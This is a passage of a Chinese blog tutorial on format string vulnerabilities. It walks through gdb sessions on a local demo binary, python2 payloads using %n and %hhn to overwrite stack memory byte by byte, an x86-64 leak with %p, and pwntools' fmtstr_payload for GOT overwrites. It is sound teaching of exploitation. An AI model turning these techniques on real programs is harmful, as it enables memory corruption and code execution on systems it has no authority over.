class="line">0xffffd55c:     0x00004443      0x00000000      0x31254141      0x416e2435</span><br><span class="line">0xffffd56c:     0xffffd538      0xffffd500      0x00000001      0x000000c2</span><br><span class="line">gdb-peda$ finish</span><br><span class="line">Run till exit from #0  0xf7e27c20 in printf () from &#x2F;usr&#x2F;lib32&#x2F;libc.so.6</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x7</span><br><span class="line">EBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1</span><br><span class="line">ECX: 0x0</span><br><span class="line">EDX: 0xf7f98830 --&gt; 0x0</span><br><span class="line">ESI: 0xf7f96e68 --&gt; 0x1bad90</span><br><span class="line">EDI: 0x0</span><br><span class="line">EBP: 0xffffd5f8 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd530 --&gt; 0xffffd564 (&quot;AA%15$nA8\325\377\377&quot;)</span><br><span class="line">EIP: 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)</span><br><span class="line">EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048514 &lt;main+126&gt;:        lea    eax,[ebp-0x94]</span><br><span class="line">   0x804851a &lt;main+132&gt;:        push   eax</span><br><span class="line">   0x804851b &lt;main+133&gt;:        call   0x8048350 &lt;printf@plt&gt;</span><br><span class="line">&#x3D;&gt; 0x8048520 &lt;main+138&gt;:        add    esp,0x20</span><br><span class="line">   0x8048523 &lt;main+141&gt;:        sub    esp,0xc</span><br><span class="line">   0x8048526 &lt;main+144&gt;:        push   0xa</span><br><span class="line">   0x8048528 &lt;main+146&gt;:        call   0x8048370 &lt;putchar@plt&gt;</span><br><span class="line">   0x804852d &lt;main+151&gt;:        add    esp,0x10</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd530 --&gt; 0xffffd564 (&quot;AA%15$nA8\325\377\377&quot;)</span><br><span class="line">0004| 0xffffd534 --&gt; 0x1</span><br><span class="line">0008| 0xffffd538 --&gt; 0x2</span><br><span class="line">0012| 0xffffd53c --&gt; 0xffffffff</span><br><span class="line">0016| 0xffffd540 --&gt; 0xffffd55a (&quot;ABCD&quot;)</span><br><span class="line">0020| 0xffffd544 --&gt; 0xffffd564 (&quot;AA%15$nA8\325\377\377&quot;)</span><br><span class="line">0024| 0xffffd548 --&gt; 0x80481fc --&gt; 0x38 (&#39;8&#39;)</span><br><span class="line">0028| 0xffffd54c --&gt; 0x80484b0 (&lt;main+26&gt;:      add    ebx,0x1b50)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x08048520 in main ()</span><br><span class="line">gdb-peda$ x&#x2F;20x $esp</span><br><span class="line">0xffffd530:     0xffffd564      0x00000001      0x00000002      0xffffffff</span><br><span class="line">0xffffd540:     0xffffd55a      0xffffd564      0x080481fc      0x080484b0</span><br><span class="line">0xffffd550:     0xf7ffda54      0x00000001      0x424135d0      0x00004443</span><br><span class="line">0xffffd560:     0x00000000      0x31254141      0x416e2435      0xffffd538</span><br><span class="line">0xffffd570:     0xffffd500      0x00000001      0x000000c2      0xf7e70240</span><br></pre></td></tr></table></figure>

<p>对比 <code>printf()</code> 函数执行前后的输出，可以看到我们成功地给 <code>arg2</code> 赋值了 <code>0x00000002</code>。</p>
<p>说完了数字小于 4 时的覆盖，接下来说说大数字的覆盖。前面的方法教我们直接输入一个地址的十进制就可以进行赋值，可是，这样占用的内存空间太大，往往会覆盖掉其他重要的地址而产生错误。其实我们可以通过长度修饰符来更改写入的值的大小：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> c;</span><br><span class="line">short s;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">long</span> l;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s %hhn\n"</span>, str, &amp;c);       <span class="comment">// 写入单字节</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s %hn\n"</span>, str, &amp;s);        <span class="comment">// 写入双字节</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s %n\n"</span>, str, &amp;i);         <span class="comment">// 写入4字节</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s %ln\n"</span>, str, &amp;l);        <span class="comment">// 写入8字节</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s %lln\n"</span>, str, &amp;ll);      <span class="comment">// 写入16字节</span></span><br></pre></td></tr></table></figure>

<p>试一下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ python2 -c <span class="string">'print("A%15$hhn"+"\x38\xd5\xff\xff")'</span> &gt; text</span><br><span class="line">0xffffd530:     0xffffd564      0x00000001      0x88888801      0xffffffff</span><br><span class="line"></span><br><span class="line">$ python2 -c <span class="string">'print("A%15$hnA"+"\x38\xd5\xff\xff")'</span> &gt; text</span><br><span class="line">0xffffd530:     0xffffd564      0x00000001      0x88880001      0xffffffff</span><br><span class="line"></span><br><span class="line">$ python2 -c <span class="string">'print("A%15$nAA"+"\x38\xd5\xff\xff")'</span> &gt; text</span><br><span class="line">0xffffd530:     0xffffd564      0x00000001      0x00000001      0xffffffff</span><br></pre></td></tr></table></figure>

<p>于是，我们就可以逐字节地覆盖，从而大大节省了内存空间。这里我们尝试写入 <code>0x12345678</code> 到地址 <code>0xffffd538</code>，首先使用 <code>AAAABBBBCCCCDDDD</code> 作为输入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r</span><br><span class="line">AAAABBBBCCCCDDDD</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd564 (&quot;AAAABBBBCCCCDDDD&quot;)</span><br><span class="line">EBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1</span><br><span class="line">ECX: 0x1</span><br><span class="line">EDX: 0xf7f9883c --&gt; 0x0</span><br><span class="line">ESI: 0xf7f96e68 --&gt; 0x1bad90</span><br><span class="line">EDI: 0x0</span><br><span class="line">EBP: 0xffffd5f8 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd52c --&gt; 0x8048520 (&lt;main+138&gt;:      add    esp,0x20)</span><br><span class="line">EIP: 0xf7e27c20 (&lt;printf&gt;:      call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e27c1b &lt;fprintf+27&gt;:     ret</span><br><span class="line">   0xf7e27c1c:  xchg   ax,ax</span><br><span class="line">   0xf7e27c1e:  xchg   ax,ax</span><br><span class="line">&#x3D;&gt; 0xf7e27c20 &lt;printf&gt;: call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">   0xf7e27c25 &lt;printf+5&gt;:       add    eax,0x16f243</span><br><span class="line">   0xf7e27c2a &lt;printf+10&gt;:      sub    esp,0xc</span><br><span class="line">   0xf7e27c2d &lt;printf+13&gt;:      mov    eax,DWORD PTR [eax+0x124]</span><br><span class="line">   0xf7e27c33 &lt;printf+19&gt;:      lea    edx,[esp+0x14]</span><br><span class="line">No argument</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd52c --&gt; 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)</span><br><span class="line">0004| 0xffffd530 --&gt; 0xffffd564 (&quot;AAAABBBBCCCCDDDD&quot;)</span><br><span class="line">0008| 0xffffd534 --&gt; 0x1</span><br><span class="line">0012| 0xffffd538 --&gt; 0x88888888</span><br><span class="line">0016| 0xffffd53c --&gt; 0xffffffff</span><br><span class="line">0020| 0xffffd540 --&gt; 0xffffd55a (&quot;ABCD&quot;)</span><br><span class="line">0024| 0xffffd544 --&gt; 0xffffd564 (&quot;AAAABBBBCCCCDDDD&quot;)</span><br><span class="line">0028| 0xffffd548 --&gt; 0x80481fc --&gt; 0x38 (&#39;8&#39;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0xf7e27c20 in printf () from &#x2F;usr&#x2F;lib32&#x2F;libc.so.6</span><br><span class="line">gdb-peda$ x&#x2F;20x $esp</span><br><span class="line">0xffffd52c:     0x08048520      0xffffd564      0x00000001      0x88888888</span><br><span class="line">0xffffd53c:     0xffffffff      0xffffd55a      0xffffd564      0x080481fc</span><br><span class="line">0xffffd54c:     0x080484b0      0xf7ffda54      0x00000001      0x424135d0</span><br><span class="line">0xffffd55c:     0x00004443      0x00000000      0x41414141      0x42424242</span><br><span class="line">0xffffd56c:     0x43434343      0x44444444      0x00000000      0x000000c2</span><br><span class="line">gdb-peda$ x&#x2F;4wb 0xffffd538</span><br><span class="line">0xffffd538:     0x88    0x88    0x88    0x88</span><br></pre></td></tr></table></figure>

<p>由于我们想要逐字节覆盖，就需要 4 个用于跳转的地址，4 个写入地址和 4 个值，对应关系如下（小端序）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffd564</span> -&gt; <span class="number">0x41414141</span> (<span class="number">0xffffd538</span>) -&gt; \x78</span><br><span class="line"><span class="number">0xffffd568</span> -&gt; <span class="number">0x42424242</span> (<span class="number">0xffffd539</span>) -&gt; \x56</span><br><span class="line"><span class="number">0xffffd56c</span> -&gt; <span class="number">0x43434343</span> (<span class="number">0xffffd53a</span>) -&gt; \x34</span><br><span class="line"><span class="number">0xffffd570</span> -&gt; <span class="number">0x44444444</span> (<span class="number">0xffffd53b</span>) -&gt; \x12</span><br></pre></td></tr></table></figure>

<p>把 <code>AAAA</code>、<code>BBBB</code>、<code>CCCC</code>、<code>DDDD</code> 占据的地址分别替换成括号中的值，再适当使用填充字节使 8 字节对齐就可以了。构造输入如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python2 -c <span class="string">'print("\x38\xd5\xff\xff"+"\x39\xd5\xff\xff"+"\x3a\xd5\xff\xff"+"\x3b\xd5\xff\xff"+"%104c%13$hhn"+"%222c%14$hhn"+"%222c%15$hhn"+"%222c%16$hhn")'</span> &gt; text</span><br></pre></td></tr></table></figure>

<p>其中前四个部分是 4 个写入地址，占 4*4=16 字节，后面四个部分分别用于写入十六进制数，由于使用了 <code>hh</code>，所以只会保留一个字节 <code>0x78</code>（16+104=120 -&gt; 0x78）、<code>0x56</code>（120+222=342 -&gt; 0x0156 -&gt; 0x56）、<code>0x34</code>（342+222=564 -&gt; 0x0234 -&gt; 0x34）、<code>0x12</code>（564+222=786 -&gt; 0x312 -&gt; 0x12）。执行结果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">$ gdb -q a.out</span><br><span class="line">Reading symbols from a.out...(no debugging symbols found)...done.</span><br><span class="line">gdb-peda$ b printf  </span><br><span class="line">Breakpoint 1 at 0x8048350</span><br><span class="line">gdb-peda$ r &lt; text  </span><br><span class="line">Starting program: &#x2F;home&#x2F;firmy&#x2F;Desktop&#x2F;RE4B&#x2F;a.out &lt; text</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd564 --&gt; 0xffffd538 --&gt; 0x88888888</span><br><span class="line">EBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1</span><br><span class="line">ECX: 0x1</span><br><span class="line">EDX: 0xf7f9883c --&gt; 0x0</span><br><span class="line">ESI: 0xf7f96e68 --&gt; 0x1bad90</span><br><span class="line">EDI: 0x0</span><br><span class="line">EBP: 0xffffd5f8 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd52c --&gt; 0x8048520 (&lt;main+138&gt;:      add    esp,0x20)</span><br><span class="line">EIP: 0xf7e27c20 (&lt;printf&gt;:      call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0xf7e27c1b &lt;fprintf+27&gt;:     ret</span><br><span class="line">   0xf7e27c1c:  xchg   ax,ax</span><br><span class="line">   0xf7e27c1e:  xchg   ax,ax</span><br><span class="line">&#x3D;&gt; 0xf7e27c20 &lt;printf&gt;: call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">   0xf7e27c25 &lt;printf+5&gt;:       add    eax,0x16f243</span><br><span class="line">   0xf7e27c2a &lt;printf+10&gt;:      sub    esp,0xc</span><br><span class="line">   0xf7e27c2d &lt;printf+13&gt;:      mov    eax,DWORD PTR [eax+0x124]</span><br><span class="line">   0xf7e27c33 &lt;printf+19&gt;:      lea    edx,[esp+0x14]</span><br><span class="line">No argument</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd52c --&gt; 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)</span><br><span class="line">0004| 0xffffd530 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x88888888</span><br><span class="line">0008| 0xffffd534 --&gt; 0x1</span><br><span class="line">0012| 0xffffd538 --&gt; 0x88888888</span><br><span class="line">0016| 0xffffd53c --&gt; 0xffffffff</span><br><span class="line">0020| 0xffffd540 --&gt; 0xffffd55a (&quot;ABCD&quot;)</span><br><span class="line">0024| 0xffffd544 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x88888888</span><br><span class="line">0028| 0xffffd548 --&gt; 0x80481fc --&gt; 0x38 (&#39;8&#39;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0xf7e27c20 in printf () from &#x2F;usr&#x2F;lib32&#x2F;libc.so.6</span><br><span class="line">gdb-peda$ x&#x2F;20x $esp  </span><br><span class="line">0xffffd52c:     0x08048520      0xffffd564      0x00000001      0x88888888</span><br><span class="line">0xffffd53c:     0xffffffff      0xffffd55a      0xffffd564      0x080481fc</span><br><span class="line">0xffffd54c:     0x080484b0      0xf7ffda54      0x00000001      0x424135d0</span><br><span class="line">0xffffd55c:     0x00004443      0x00000000      0xffffd538      0xffffd539</span><br><span class="line">0xffffd56c:     0xffffd53a      0xffffd53b      0x34303125      0x33312563</span><br><span class="line">gdb-peda$ finish</span><br><span class="line">Run till exit from #0  0xf7e27c20 in printf () from &#x2F;usr&#x2F;lib32&#x2F;libc.so.6</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x312</span><br><span class="line">EBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1</span><br><span class="line">ECX: 0x0</span><br><span class="line">EDX: 0xf7f98830 --&gt; 0x0</span><br><span class="line">ESI: 0xf7f96e68 --&gt; 0x1bad90</span><br><span class="line">EDI: 0x0</span><br><span class="line">EBP: 0xffffd5f8 --&gt; 0x0</span><br><span class="line">ESP: 0xffffd530 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x12345678</span><br><span class="line">EIP: 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)</span><br><span class="line">EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048514 &lt;main+126&gt;:        lea    eax,[ebp-0x94]</span><br><span class="line">   0x804851a &lt;main+132&gt;:        push   eax</span><br><span class="line">   0x804851b &lt;main+133&gt;:        call   0x8048350 &lt;printf@plt&gt;</span><br><span class="line">&#x3D;&gt; 0x8048520 &lt;main+138&gt;:        add    esp,0x20</span><br><span class="line">   0x8048523 &lt;main+141&gt;:        sub    esp,0xc</span><br><span class="line">   0x8048526 &lt;main+144&gt;:        push   0xa</span><br><span class="line">   0x8048528 &lt;main+146&gt;:        call   0x8048370 &lt;putchar@plt&gt;</span><br><span class="line">   0x804852d &lt;main+151&gt;:        add    esp,0x10</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd530 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x12345678</span><br><span class="line">0004| 0xffffd534 --&gt; 0x1</span><br><span class="line">0008| 0xffffd538 --&gt; 0x12345678</span><br><span class="line">0012| 0xffffd53c --&gt; 0xffffffff</span><br><span class="line">0016| 0xffffd540 --&gt; 0xffffd55a (&quot;ABCD&quot;)</span><br><span class="line">0020| 0xffffd544 --&gt; 0xffffd564 --&gt; 0xffffd538 --&gt; 0x12345678</span><br><span class="line">0024| 0xffffd548 --&gt; 0x80481fc --&gt; 0x38 (&#39;8&#39;)</span><br><span class="line">0028| 0xffffd54c --&gt; 0x80484b0 (&lt;main+26&gt;:      add    ebx,0x1b50)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x08048520 in main ()</span><br><span class="line">gdb-peda$ x&#x2F;20x $esp</span><br><span class="line">0xffffd530:     0xffffd564      0x00000001      0x12345678      0xffffffff</span><br><span class="line">0xffffd540:     0xffffd55a      0xffffd564      0x080481fc      0x080484b0</span><br><span class="line">0xffffd550:     0xf7ffda54      0x00000001      0x424135d0      0x00004443</span><br><span class="line">0xffffd560:     0x00000000      0xffffd538      0xffffd539      0xffffd53a</span><br><span class="line">0xffffd570:     0xffffd53b      0x34303125      0x33312563      0x6e686824</span><br></pre></td></tr></table></figure>

<p>最后还得强调两点：</p>
<ul>
<li>首先是需要关闭整个系统的 ASLR 保护，这可以保证栈在 gdb 环境中和直接运行中都保持不变，但这两个栈地址不一定相同</li>
<li>其次因为在 gdb 调试环境中的栈地址和直接运行程序是不一样的，所以我们需要结合格式化字符串漏洞读取内存，先泄露一个地址出来，然后根据泄露出来的地址计算实际地址</li>
</ul>
<h2 id="x86-64-中的格式化字符串漏洞"><a href="#x86-64-中的格式化字符串漏洞" class="headerlink" title="x86-64 中的格式化字符串漏洞"></a>x86-64 中的格式化字符串漏洞</h2><p>在 x64 体系中，多数调用惯例都是通过寄存器传递参数。在 Linux 上，前六个参数通过 <code>RDI</code>、<code>RSI</code>、<code>RDX</code>、<code>RCX</code>、<code>R8</code> 和 <code>R9</code> 传递；而在 Windows 中，前四个参数通过 <code>RCX</code>、<code>RDX</code>、<code>R8</code> 和 <code>R9</code> 来传递。</p>
<p>还是上面的程序，但是这次我们把它编译成 64 位：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -fno-stack-protector -no-pie fmt.c</span><br></pre></td></tr></table></figure>

<p>使用 <code>AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.</code> 作为输入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ n</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x0</span><br><span class="line">RBX: 0x0</span><br><span class="line">RCX: 0xffffffff</span><br><span class="line">RDX: 0x88888888</span><br><span class="line">RSI: 0x1</span><br><span class="line">RDI: 0x7fffffffe3d0 (&quot;AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.&quot;)</span><br><span class="line">RBP: 0x7fffffffe460 --&gt; 0x400660 (&lt;__libc_csu_init&gt;:    push   r15)</span><br><span class="line">RSP: 0x7fffffffe3c0 --&gt; 0x4241000000000000 (&#39;&#39;)</span><br><span class="line">RIP: 0x400648 (&lt;main+113&gt;:      call   0x4004e0 &lt;printf@plt&gt;)</span><br><span class="line">R8 : 0x7fffffffe3c6 --&gt; 0x44434241 (&#39;ABCD&#39;)</span><br><span class="line">R9 : 0xa (&#39;\n&#39;)</span><br><span class="line">R10: 0x7ffff7dd4380 --&gt; 0x7ffff7dd0640 --&gt; 0x7ffff7b9ed3a --&gt; 0x636d656d5f5f0043 (&#39;C&#39;)</span><br><span class="line">R11: 0x246</span><br><span class="line">R12: 0x400500 (&lt;_start&gt;:        xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffe540 --&gt; 0x1</span><br><span class="line">R14: 0x0</span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x40063d &lt;main+102&gt;: mov    r8,rdi</span><br><span class="line">   0x400640 &lt;main+105&gt;: mov    rdi,rax</span><br><span class="line">   0x400643 &lt;main+108&gt;: mov    eax,0x0</span><br><span class="line">&#x3D;&gt; 0x400648 &lt;main+113&gt;: call   0x4004e0 &lt;printf@plt&gt;</span><br><span class="line">   0x40064d &lt;main+118&gt;: mov    edi,0xa</span><br><span class="line">   0x400652 &lt;main+123&gt;: call   0x4004d0 &lt;putchar@plt&gt;</span><br><span class="line">   0x400657 &lt;main+128&gt;: nop</span><br><span class="line">   0x400658 &lt;main+129&gt;: leave</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0x7fffffffe3d0 (&quot;AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.&quot;)</span><br><span class="line">arg[1]: 0x1</span><br><span class="line">arg[2]: 0x88888888</span><br><span class="line">arg[3]: 0xffffffff</span><br><span class="line">arg[4]: 0x7fffffffe3c6 --&gt; 0x44434241 (&#39;ABCD&#39;)</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffe3c0 --&gt; 0x4241000000000000 (&#39;&#39;)</span><br><span class="line">0008| 0x7fffffffe3c8 --&gt; 0x4443 (&#39;CD&#39;)</span><br><span class="line">0016| 0x7fffffffe3d0 (&quot;AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.&quot;)</span><br><span class="line">0024| 0x7fffffffe3d8 (&quot;%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.&quot;)</span><br><span class="line">0032| 0x7fffffffe3e0 (&quot;.%p.%p.%p.%p.%p.%p.%p.&quot;)</span><br><span class="line">0040| 0x7fffffffe3e8 (&quot;p.%p.%p.%p.%p.&quot;)</span><br><span class="line">0048| 0x7fffffffe3f0 --&gt; 0x2e70252e7025 (&#39;%p.%p.&#39;)</span><br><span class="line">0056| 0x7fffffffe3f8 --&gt; 0x1</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x0000000000400648 in main ()</span><br><span class="line">gdb-peda$ x&#x2F;10g $rsp</span><br><span class="line">0x7fffffffe3c0: 0x4241000000000000      0x0000000000004443</span><br><span class="line">0x7fffffffe3d0: 0x4141414141414141      0x70252e70252e7025</span><br><span class="line">0x7fffffffe3e0: 0x252e70252e70252e      0x2e70252e70252e70</span><br><span class="line">0x7fffffffe3f0: 0x00002e70252e7025      0x0000000000000001</span><br><span class="line">0x7fffffffe400: 0x0000000000f0b5ff      0x00000000000000c2</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">AAAAAAAA0x1.0x88888888.0xffffffff.0x7fffffffe3c6.0xa.0x4241000000000000.0x4443.0x4141414141414141.0x70252e70252e7025.0x252e70252e70252e.</span><br></pre></td></tr></table></figure>

<p>可以看到我们最后的输出中，前五个数字分别来自寄存器 <code>RSI</code>、<code>RDX</code>、<code>RCX</code>、<code>R8</code> 和 <code>R9</code>，后面的数字才取自栈，<code>0x4141414141414141</code> 在 <code>%8$p</code> 的位置。这里还有个地方要注意，我们前面说的 Linux 有 6 个寄存器用于传递参数，可是这里只输出了 5 个，原因是有一个寄存器 <code>RDI</code> 被用于传递格式字符串，可以从 gdb 中看到，<code>arg[0]</code> 就是由 <code>RDI</code> 传递的格式字符串。（现在你可以再回到 x86 的相关内容，可以看到在 x86 中格式字符串通过栈传递的，但是同样的也不会被打印出来）其他的操作和 x86 没有什么大的区别，只是这时我们就不能修改 <code>arg2</code> 的值了，因为它被存入了寄存器中。</p>
<h2 id="CTF-中的格式化字符串漏洞"><a href="#CTF-中的格式化字符串漏洞" class="headerlink" title="CTF 中的格式化字符串漏洞"></a>CTF 中的格式化字符串漏洞</h2><h3 id="fmtstr-payload"><a href="#fmtstr-payload" class="headerlink" title="fmtstr_payload"></a>fmtstr_payload</h3><ul>
<li><p>fmtstr_payload是pwntools里面的一个工具，用来简化对格式化字符串漏洞的构造工作。</p>
</li>
<li><p>可以实现修改任意内存<br>fmtstr_payload(offset, {printf_got: system_addr})(偏移，{原地址：目的地址})</p>
</li>
<li><p><strong>实际上我们常用的形式是fmtstr_payload(offset,{address1:value1})</strong></p>
</li>
<li><p>这个是专门为<strong>32位</strong>程序格式化字符串漏洞输出payload的一个函数</p>
</li>
</ul>
